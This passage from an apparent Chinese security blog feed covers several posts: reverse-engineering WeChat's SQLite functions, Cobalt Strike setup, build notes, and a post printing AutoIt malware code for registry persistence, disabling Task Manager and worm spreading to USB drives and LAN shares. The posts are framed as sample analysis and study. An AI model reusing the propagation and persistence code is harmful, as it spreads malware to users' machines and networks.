title="kywqr2xq.png"></p><p>4、我这里选择<code>NOCASE</code>作为特征查阅，你要问我为什么，我只能说这几个明文截图中就他和<code>RIRIM</code>出现的最少。而通过动态调试，结果告诉我，我选择的雀氏不错，只有两个地方匹配，那么就很简单了，我们定位到他们的函数头，复制RVA去IDA中查看他的参数列表以及函数特征是否匹配。</p><p><img src="/../uploads/2022/01/3272428971.png" alt="kywqtpjl.png" title="kywqtpjl.png"></p><p>5、第一个我们点进去在IDA查看，他和demo中差距较大，他有五个参数，而<code>openDatabase</code>中只有四个参数。有时ida的参数也不会准确，所以为了更加准确，我们对比两个函数的代码，发现也是大不相同，所以pass第一处，查看第二处。<br>6、第二处应该是我们需要的函数<code>openDatabase</code>了，首先参数列表匹配。其次函数体较为相似，如下图所示。</p><p>第一处：<br><img src="/../uploads/2022/01/2773230516.png" alt="kywr1v5h.png" title="kywr1v5h.png"><br><img src="/../uploads/2022/01/662246150.png" alt="kywr28k9.png" title="kywr28k9.png"><br>第二处：<br><img src="/../uploads/2022/01/4119922070.png" alt="kywr2k4f.png" title="kywr2k4f.png"><br><img src="/../uploads/2022/01/960159004.png" alt="kywr2zda.png" title="kywr2zda.png"><br>第三处：<br><img src="/../uploads/2022/01/3530363301.png" alt="kywr4k25.png" title="kywr4k25.png"><br><img src="/../uploads/2022/01/396527449.png" alt="kywr4nw4.png" title="kywr4nw4.png"></p><p>7、光是对比静态代码也只是缩小范围，还是不能作为确定依据，所以我们目前认定该函数就是<code>openDatabase</code>。所以在x32dbg中对其下断，重新登录微信，因为他查询数据库之前一定要对其解密并且打开。如果断点没有过来，则代表我们找错了。那么就需要用其他办法进行分析。但是幸运女神照顾我，他确实是<code>openDatabase</code>函数，返回的句柄也是数据库句柄，如下图所示。</p><p><img src="/../uploads/2022/01/3463777719.png" alt="kywrb8gc.png" title="kywrb8gc.png"></p><p>8、我们将函数执行到返回地址，看看他调用它的是谁，但是很遗憾，返回回去就是虚拟化代码了，所以我们要获得数据库句柄只能从此函数下手，剩下的则为代码编写，本文就不再阐述。</p><h2 id="分析sqlite3-exec函数"><a href="#分析sqlite3-exec函数" class="headerlink" title="分析sqlite3_exec函数"></a>分析sqlite3_exec函数</h2><p>1、首先定位到demo中函数<code>sqlite3_exec</code>的执行位置</p><p><img src="/../uploads/2022/01/1172140628.png" alt="kywow44a.png" title="kywow44a.png"></p><p>2、分析函数<code>sqlite3_exec</code>的特征，我们不难发现他会有几处字符串特性。如下所示</p><p><img src="/../uploads/2022/01/233515207.png" alt="kywoyfhq.png" title="kywoyfhq.png"></p><p>3、得到此处特征后，我们附加微信，查看微信相匹配特征函数。这里我选择字符串<code>%s at line %d of [%.10s]</code>为目标搜索</p><p><img src="/../uploads/2022/01/1533136465.png" alt="kywp2ivg.png" title="kywp2ivg.png"></p><p>4、发现搜索到了一大堆结果，于是准备换一个字符串进行搜索，经过测试发现<code>misuse</code>字符串搜索结果是最少的，所以对该字符串搜索的结果一一排查，通过特征确定哪个函数是<code>sqlite3_exec</code>。</p><p><img src="/../uploads/2022/01/630167849.png" alt="kywpg408.png" title="kywpg408.png"></p><p>5、首先找到该函数的函数头，再复制他的RVA，到IDA窗口中定位其位置后，进行反编译代码</p><p><img src="/../uploads/2022/01/2683235329.png" alt="kywpkdpk.png" title="kywpkdpk.png"></p><p>6、很快我们找到一处与<code>sqlite3_exec</code>函数特征相匹配的函数。那么该函数极为有可能是<code>sqlite3_exec</code>函数。</p><p><img src="/../uploads/2022/01/2224161077.png" alt="kywpppxd.png" title="kywpppxd.png"></p><p>7、对该函数的a3参数改名为callback，查看是否有调用，因为回调函数是一定会调用的，如果有这个特征那么可以更加确定是该函数。经过查阅伪代码，我们可以几乎确定该函数为<code>sqlite3_exec</code>函数。</p><p><img src="/../uploads/2022/01/2096243609.png" alt="kywptnsd.png" title="kywptnsd.png"></p><p><img src="/../uploads/2022/01/3308757471.png" alt="kywpu7nh.png" title="kywpu7nh.png"></p><p>8、静态分析完成后，我们再尝试动态分析该函数，对其进行下断，我们重新登录微信，因为微信在登录过程中一定会查询数据库，如果这个过程中没有调用该函数，证明我们寻找错误，则需要返回继续寻找相匹配函数。<br>9、经过动态调试，我们很明显的看到堆栈列表中的传参情况，所以该函数就是我们想要的<code>sqlite3_exec</code>函数，剩下则是代码编写过程，本文就不再阐述了。</p><p><img src="/../uploads/2022/01/3677661941.png" alt="kywq0jn9.png" title="kywq0jn9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Autoit样本常见操作</title>
      <link href="/ca42ea8a11cc/"/>
      <url>/ca42ea8a11cc/</url>
      
        <content type="html"><![CDATA[<h1 id="AutoIt在线文档"><a href="#AutoIt在线文档" class="headerlink" title="AutoIt在线文档"></a>AutoIt在线文档</h1><hr><p><a href="https://www.autoitx.com/Doc/">https://www.autoitx.com/Doc/</a></p><h1 id="注册表行为"><a href="#注册表行为" class="headerlink" title="注册表行为"></a>注册表行为</h1><hr><h2 id="设置开机自启"><a href="#设置开机自启" class="headerlink" title="设置开机自启"></a>设置开机自启</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RegWrite (<span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span>,<span class="string">&quot;Shell&quot;</span>,<span class="string">&quot;REG_SZ&quot;</span>,<span class="string">&quot;Explorer.exe &quot;</span> &amp; <span class="variable">$name</span> &amp; <span class="variable">$exe</span>)</span><br><span class="line">RegWrite (<span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span>,<span class="string">&quot;Yahoo Messengger&quot;</span>,<span class="string">&quot;REG_SZ&quot;</span>,@SystemDir &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="variable">$name</span> &amp; <span class="variable">$exe</span>) </span><br></pre></td></tr></table></figure><h2 id="禁用“设置”菜单中的“文件夹选项”"><a href="#禁用“设置”菜单中的“文件夹选项”" class="headerlink" title="禁用“设置”菜单中的“文件夹选项”"></a>禁用“设置”菜单中的“文件夹选项”</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegWrite (<span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot;</span>,<span class="string">&quot;NofolderOptions&quot;</span>,<span class="string">&quot;REG_DWORD&quot;</span>,<span class="number">1</span>) </span><br></pre></td></tr></table></figure><h2 id="禁用任务管理器"><a href="#禁用任务管理器" class="headerlink" title="禁用任务管理器"></a>禁用任务管理器</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegWrite (<span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System&quot;</span>, <span class="string">&quot;DisableTaskMgr&quot;</span>, <span class="string">&quot;REG_DWORD&quot;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="禁用注册表"><a href="#禁用注册表" class="headerlink" title="禁用注册表"></a>禁用注册表</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegWrite (<span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System&quot;</span>, <span class="string">&quot;DisableRegistryTools&quot;</span>, <span class="string">&quot;REG_DWORD&quot;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="设置计划任务永不停止"><a href="#设置计划任务永不停止" class="headerlink" title="设置计划任务永不停止"></a>设置计划任务永不停止</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegWrite (<span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule&quot;</span>,<span class="string">&quot;AtTaskMaxHours&quot;</span>,<span class="string">&quot;REG_DWORD&quot;</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="读取局域网共享文件设置"><a href="#读取局域网共享文件设置" class="headerlink" title="读取局域网共享文件设置"></a>读取局域网共享文件设置</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = RegRead (<span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares&quot;</span>,<span class="string">&quot;shared&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="计划任务行为"><a href="#计划任务行为" class="headerlink" title="计划任务行为"></a>计划任务行为</h1><hr><h2 id="用到的函数"><a href="#用到的函数" class="headerlink" title="用到的函数"></a>用到的函数</h2><p>注：CMD以隐藏窗口模式执行命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Func _RunDOS(<span class="variable">$sCommand</span>)</span><br><span class="line">    <span class="keyword">Return</span> RunWait(@ComSpec &amp; <span class="string">&quot; /C &quot;</span> &amp; <span class="variable">$sCommand</span>, <span class="string">&quot;&quot;</span>, @SW_HIDE)</span><br><span class="line">EndFunc   ;==&gt;_RunDOS</span><br></pre></td></tr></table></figure><h2 id="取消所有已计划命令"><a href="#取消所有已计划命令" class="headerlink" title="取消所有已计划命令"></a>取消所有已计划命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_RunDOS (<span class="string">&quot;AT /delete /yes&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="定时运行样本"><a href="#定时运行样本" class="headerlink" title="定时运行样本"></a>定时运行样本</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_RunDOS (<span class="string">&quot;AT 09:00 /interactive /EVERY:m,t,w,th,f,s,su &quot;</span> &amp; @SystemDir &amp; <span class="string">&quot;\&quot;</span> &amp;<span class="variable">$name</span> &amp; <span class="variable">$exe</span>) </span><br></pre></td></tr></table></figure><h1 id="横向传播行为"><a href="#横向传播行为" class="headerlink" title="横向传播行为"></a>横向传播行为</h1><hr><h2 id="用到的函数-1"><a href="#用到的函数-1" class="headerlink" title="用到的函数"></a>用到的函数</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Func Search(<span class="variable">$current</span>)</span><br><span class="line">    Local <span class="variable">$search</span> = FileFindFirstFile(<span class="variable">$current</span> &amp; <span class="string">&quot;\*.*&quot;</span>)</span><br><span class="line">    ; 遍历目录所有文件，如果是目录则将样本复制到该目录中，并且样本名字为目录名+<span class="variable">$exe</span></span><br><span class="line">    <span class="keyword">While</span> <span class="number">1</span></span><br><span class="line">        Dim <span class="variable">$file</span> = FileFindNextFile(<span class="variable">$search</span>)</span><br><span class="line">        <span class="keyword">If</span> @error Or StringLen(<span class="variable">$file</span>) &lt; <span class="number">1</span> Then ExitLoop</span><br><span class="line">        <span class="keyword">If</span> StringInStr(FileGetAttrib(<span class="variable">$current</span> &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="variable">$file</span>), <span class="string">&quot;D&quot;</span>) And (<span class="variable">$file</span> &lt;&gt; <span class="string">&quot;.&quot;</span> Or <span class="variable">$file</span> &lt;&gt; <span class="string">&quot;..&quot;</span>) Then </span><br><span class="line">            ; 判断如果为文件夹且不是.目录和..目录时将样本复制到该目录下名为<span class="string">&quot;目录名.exe&quot;</span></span><br><span class="line">            FileCopy (@WindowsDir &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="variable">$name</span> &amp; <span class="variable">$exe</span>,<span class="variable">$current</span> &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="variable">$file</span> &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="variable">$file</span> &amp; <span class="variable">$exe</span>,<span class="number">0</span>)</span><br><span class="line">            Search(<span class="variable">$current</span> &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="variable">$file</span>)</span><br><span class="line">        EndIf</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Sleep</span> (<span class="number">1</span>)</span><br><span class="line">    WEnd</span><br><span class="line">    FileClose(<span class="variable">$search</span>)</span><br><span class="line">EndFunc</span><br></pre></td></tr></table></figure><h2 id="U盘横向传播"><a href="#U盘横向传播" class="headerlink" title="U盘横向传播"></a>U盘横向传播</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Func copyusb()</span><br><span class="line">    Dim <span class="variable">$usb</span>[<span class="number">10</span>]</span><br><span class="line">    <span class="variable">$usb</span>[<span class="number">0</span>]=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="variable">$usb</span>[<span class="number">1</span>]=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="variable">$usb</span>[<span class="number">2</span>]=<span class="string">&quot;&quot;</span></span><br><span class="line">    ; 获取可移动驱动器</span><br><span class="line">    <span class="variable">$odia</span> = DriveGetDrive(<span class="string">&quot;REMOVABLE&quot;</span>)</span><br><span class="line">    <span class="keyword">If</span> NOT @error Then</span><br><span class="line">        <span class="keyword">For</span> <span class="variable">$i</span>=<span class="number">1</span> To <span class="variable">$odia</span>[<span class="number">0</span>]</span><br><span class="line">            <span class="variable">$usb</span>[<span class="variable">$i</span>]=<span class="variable">$odia</span>[<span class="variable">$i</span>]</span><br><span class="line">        Next</span><br><span class="line">        <span class="keyword">If</span> <span class="variable">$usb</span>[<span class="number">1</span>] &lt;&gt;<span class="string">&quot;A:&quot;</span> Then</span><br><span class="line">            <span class="keyword">If</span> <span class="variable">$usb</span> [<span class="number">1</span>] &lt;&gt;<span class="string">&quot;&quot;</span> Then</span><br><span class="line">                FileCopy (@WindowsDir &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="variable">$name</span> &amp; <span class="variable">$exe</span>,<span class="variable">$usb</span>[<span class="number">1</span>] &amp; <span class="string">&quot;\New Folder.exe&quot;</span>,<span class="number">0</span>)</span><br><span class="line">                Search(<span class="variable">$usb</span>[<span class="number">1</span>])</span><br><span class="line">            EndIf</span><br><span class="line">        EndIf</span><br><span class="line">        <span class="keyword">If</span> <span class="variable">$usb</span>[<span class="number">1</span>]=<span class="string">&quot;A:&quot;</span> Then</span><br><span class="line">            <span class="keyword">If</span> <span class="variable">$usb</span>[<span class="number">2</span>]&lt;&gt;<span class="string">&quot;&quot;</span> Then</span><br><span class="line">                FileCopy (@WindowsDir &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="variable">$name</span> &amp; <span class="variable">$exe</span>,<span class="variable">$usb</span>[<span class="number">2</span>] &amp; <span class="string">&quot;\New Folder.exe&quot;</span>,<span class="number">0</span>)</span><br><span class="line">                Search(<span class="variable">$usb</span>[<span class="number">2</span>])</span><br><span class="line">            EndIf</span><br><span class="line">        EndIf</span><br><span class="line">    EndIf</span><br><span class="line">EndFunc</span><br></pre></td></tr></table></figure><h2 id="局域网横向传播"><a href="#局域网横向传播" class="headerlink" title="局域网横向传播"></a>局域网横向传播</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Func copynetwork ()</span><br><span class="line">    Dim <span class="variable">$mang</span>[<span class="number">30</span>]</span><br><span class="line">    <span class="keyword">For</span> <span class="variable">$i</span>=<span class="number">1</span> to <span class="number">30</span></span><br><span class="line">        <span class="variable">$read</span> = RegEnumKey (<span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares&quot;</span>,<span class="variable">$i</span>) ; 遍历key</span><br><span class="line">        <span class="keyword">If</span> @error Then ExitLoop</span><br><span class="line">        <span class="variable">$read</span> = StringReplace (<span class="variable">$read</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;\&quot;</span>) ; 替换字符串<span class="string">&quot;/&quot;</span>为<span class="string">&quot;\&quot;</span></span><br><span class="line">        <span class="variable">$mang</span>[<span class="variable">$i</span>] = <span class="string">&quot;\\&quot;</span> &amp; <span class="variable">$read</span></span><br><span class="line">        <span class="variable">$checkcopy</span> = FileCopy (@WindowsDir &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="variable">$name</span> &amp; <span class="variable">$exe</span>,<span class="variable">$mang</span>[<span class="variable">$i</span>] &amp; <span class="string">&quot;\New Folder.exe&quot;</span>,<span class="number">1</span>) ; 将RVHOST.exe复制到该共享目录下覆盖为New Folder.exe</span><br><span class="line">        ; 如果成功则开始局域网扩散</span><br><span class="line">        <span class="keyword">If</span> <span class="variable">$checkcopy</span> =<span class="number">1</span> Then</span><br><span class="line">            Search(<span class="variable">$mang</span>[<span class="variable">$i</span>])</span><br><span class="line">        EndIf</span><br><span class="line">    Next</span><br><span class="line">    RegWrite (<span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares&quot;</span>,<span class="string">&quot;shared&quot;</span>,<span class="string">&quot;REG_SZ&quot;</span>,<span class="variable">$mang</span>[<span class="variable">$i</span>-<span class="number">1</span>] &amp; <span class="string">&quot;\New Folder.exe&quot;</span>)</span><br><span class="line">EndFunc</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VCPKG使用libcurl的一些小问题</title>
      <link href="/46c640d4791a/"/>
      <url>/46c640d4791a/</url>
      
        <content type="html"><![CDATA[<h1 id="libcurl"><a href="#libcurl" class="headerlink" title="libcurl"></a>libcurl</h1><hr><p>在非MFC程序中使用vcpkg安装的libcurl的时候需要手动引入如下两个库文件，否则会报错。MFC帮我们自动引入了，所以无需手动引入</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Crypt32.lib&quot;</span>)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> libcurl </tag>
            
            <tag> vcpkg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>样本中常见的敏感函数</title>
      <link href="/369ff045ca6e/"/>
      <url>/369ff045ca6e/</url>
      
        <content type="html"><![CDATA[<ol><li>VirtualAlloc - 为ShellCode申请空间</li><li>CreateFileMapping</li><li>MapViewofFile</li><li>VirtualProtect - 为ShellCode空间改为可读可写可执行</li><li>CreateThread</li><li>CreateProcess - 启动进程</li><li>CreateToolhelp32Snapshot - 创建进程快照，检测虚拟机调试器注入等操作</li><li>InternetOpen -</li><li>InternetConnect - 连接到服务端</li><li>HttpOpenRequest</li><li>InternetSetOption - 设置C2Profile</li><li>HttpSendRequest</li><li>InternetReadFile - 多用于读取payload后续的核心的DLL的反射</li><li>CopyFile - 多用于样本的自我拷贝，内网传播等</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike环境配置及搭建</title>
      <link href="/39c916ced456/"/>
      <url>/39c916ced456/</url>
      
        <content type="html"><![CDATA[<h1 id="Cobaltstrike简介"><a href="#Cobaltstrike简介" class="headerlink" title="Cobaltstrike简介"></a>Cobaltstrike简介</h1><p>Cobalt Strike是一款美国Red Team开发的渗透测试神器，常被业界人称为CS。是渗透测试中不可缺少的利器。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。<br>项目官网:<a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a></p><h1 id="安装运行环境"><a href="#安装运行环境" class="headerlink" title="安装运行环境"></a>安装运行环境</h1><p>因为Cobaltstrike需要Java环境，所以我们安装jdk-8u202-windows-x64.exe，推荐下载离线安装包，否则会很慢很慢。</p><h1 id="开启服务端"><a href="#开启服务端" class="headerlink" title="开启服务端"></a>开启服务端</h1><p>在cmd中运行teamserver.bat文件，命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">teamserver.bat ip 密码</span><br><span class="line"><span class="comment"># 其意思为你服务器对外公开的IP地址，以及客户端连接该服务器的密码</span></span><br></pre></td></tr></table></figure><p>只要你出现如下图所示信息， 代表你的服务端启动成功</p><p><img src="/../uploads/2021/11/2708771274.png" alt="kw4svijy.png" title="kw4svijy.png"></p><h1 id="连接服务端"><a href="#连接服务端" class="headerlink" title="连接服务端"></a>连接服务端</h1><p>服务端启动成功后，那么以管理员权限运行我们目录下的cobaltstrike.exe</p><p><img src="/../uploads/2021/11/731286410.png" alt="kw4sxojx.png" title="kw4sxojx.png"></p><p>Host：填写你的服务器公网IP，或测试时用的内网IP。<br>Port：填写服务器开启成功时日志告诉你的端口号<br>User：填写你的名称（可以自定义）<br>Password：填写我们上述服务器认证密码</p><p><img src="/../uploads/2021/11/2364668500.png" alt="kw4sy8fu.png" title="kw4sy8fu.png"></p><p>连接成功会显示如下信息</p><p><img src="/../uploads/2021/11/442734584.png" alt="kw4t0ije.png" title="kw4t0ije.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>B站专栏复制</title>
      <link href="/f656077b0d9c/"/>
      <url>/f656077b0d9c/</url>
      
        <content type="html"><![CDATA[<p>打开浏览器控制台[F12键]，将下列代码粘贴到Constole中敲回车即可复制专栏内容。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div.article-holder&#x27;</span>).<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;unable-reprint&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div.article-holder&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;copy&#x27;</span>,<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    e.<span class="property">clipboardData</span>.<span class="title function_">setData</span>(<span class="string">&quot;text&quot;</span>,<span class="variable language_">window</span>.<span class="title function_">getSelection</span>().<span class="title function_">toString</span>())</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="/../uploads/2021/10/1444434367.png" alt="kv6hsfv5.png" title="kv6hsfv5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>编译并使用openssl【32/64】</title>
      <link href="/7e5b45150be1/"/>
      <url>/7e5b45150be1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本教程为openssl-1.1.1j.tar.gz为例子</p></blockquote><h1 id="第一步：下载OpenSSL源码"><a href="#第一步：下载OpenSSL源码" class="headerlink" title="第一步：下载OpenSSL源码"></a>第一步：下载OpenSSL源码</h1><hr><p>下载地址: <a href="https://www.openssl.org/source/">https://www.openssl.org/source/</a><br>个人网盘: <a href="https://pan.ltools.vip/#/s/o8TJ">https://pan.ltools.vip/#/s/o8TJ</a></p><p><img src="/../uploads/2021/10/1079917937.png" alt="kv6h007q.png" title="kv6h007q.png"></p><p>选择 <code>openssl-x.x.x?.tar.gz</code> 其中 <code>x.x.x?</code> 为目前最新版本号<br>解压到任意目录下，后续的目录均用 <code>PATH</code> 代替</p><h1 id="第二步：下载安装ActivePerl"><a href="#第二步：下载安装ActivePerl" class="headerlink" title="第二步：下载安装ActivePerl"></a>第二步：下载安装ActivePerl</h1><hr><p>下载地址：<a href="https://www.activestate.com/activeperl/downloads/">https://www.activestate.com/activeperl/downloads/</a><br>个人网盘: <a href="https://pan.ltools.vip/#/s/m4sP">https://pan.ltools.vip/#/s/m4sP</a><br>如果这个网址打不开的话，可以直接百度搜索ActivePerl下载。<br>运行安装程序，一直下一步操作安装完成。这里默认安装在C:\Perl64。</p><p><img src="/../uploads/2021/10/2096875479.png" alt="kv6h158k.png" title="kv6h158k.png"></p><p>打开 <code>C:\Perl64\site\lib\ActivePerl\Config.pm</code> 文件，将400行左右的代码注释掉，如下图。</p><p><img src="/../uploads/2021/10/1281089135.png" alt="kv6h27u6.png" title="kv6h27u6.png"></p><h1 id="第三步：编译64位版本"><a href="#第三步：编译64位版本" class="headerlink" title="第三步：编译64位版本"></a>第三步：编译64位版本</h1><hr><p>1、打开VS2019的 <code>x86_x64 Cross Tools Command Prompt for VS 2019</code> 软件</p><p><img src="/../uploads/2021/10/1902721402.png" alt="kv6h3i09.png" title="kv6h3i09.png"></p><p><img src="/../uploads/2021/10/3946521072.png" alt="kv6h3szh.png" title="kv6h3szh.png"></p><p>2、使用 <code>cd /d PATH</code> 到我们的解压目录</p><p>3、使用 <code>perl Configure VC-WIN64A no-asm no-shared --prefix=&quot;C:\Program Files\openssl_bin&quot;</code> 进行生成编译脚本</p><p>4、如果编译不过，出现LNK2019等错误的时候，你可能还需要添加ws2_32.lib,crypt32.lib库。打开我们的 <code>PATH</code> 目录下 <code>makefile</code> 文件，将如下位置 <code>EX_LIBS</code> 后添加 <code>Crypt32.lib Ws2_32.lib</code></p><p><img src="/../uploads/2021/10/906758262.png" alt="kv6h5enb.png" title="kv6h5enb.png"></p><p>5、使用 <code>nmake</code> 进行编译</p><p>6、使用 <code>nmake test</code> 进行测试，出现 <code>Result: PASS</code> 则为成功</p><p>7、使用 <code>nmake install</code> 将编译好的文件拷贝到我们设定的目录下 <code>C:\Program Files\openssl_bin</code></p><p>8、使用 <code>nmake clean</code> 清除上次静态库的编译，以便重新编译</p><h1 id="第四步：编译32位版本"><a href="#第四步：编译32位版本" class="headerlink" title="第四步：编译32位版本"></a>第四步：编译32位版本</h1><p>1、打开VS2019的 <code>x64_x86 Cross Tools Command Prompt for VS 2019</code> 软件</p><p><img src="/../uploads/2021/10/3151139558.png" alt="kv6h6vs7.png" title="kv6h6vs7.png"></p><p><img src="/../uploads/2021/10/3288975267.png" alt="kv6h70i4.png" title="kv6h70i4.png"></p><p>2、使用 <code>cd /d PATH</code> 到我们的解压目录</p><p>3、使用 <code>perl Configure VC-WIN32 no-asm no-shared --prefix=&quot;C:\Program Files (x86)\openssl_bin&quot;</code> 进行生成编译脚本</p><p>4、如果编译不过，出现LNK2019等错误的时候，你可能还需要添加ws2_32.lib,crypt32.lib库。打开我们的 <code>PATH</code> 目录下 <code>makefile</code> 文件，将如下位置 <code>EX_LIBS</code> 后添加 <code>Crypt32.lib Ws2_32.lib</code></p><p>5、使用 <code>nmake</code> 进行编译</p><p>6、使用 <code>nmake test</code> 进行测试，出现 <code>Result: PASS</code> 则为成功</p><p>7、使用 <code>nmake install</code> 将编译好的文件拷贝到我们设定的目录下 <code>C:\Program Files (x86)\openssl_bin</code></p><p>8、使用 <code>nmake clean</code> 清除上次静态库的编译，以便重新编译</p><h1 id="第五步：使用openssl库"><a href="#第五步：使用openssl库" class="headerlink" title="第五步：使用openssl库"></a>第五步：使用openssl库</h1><p>1、给项目包含目录添加我们编译好的openssl库文件中的 <code>include</code> 目录</p><p>2、在使用openssl库函数时，添加如下头文件（按需添加）即可，一下使用RSA为例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/rsa.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/engine.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/pem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 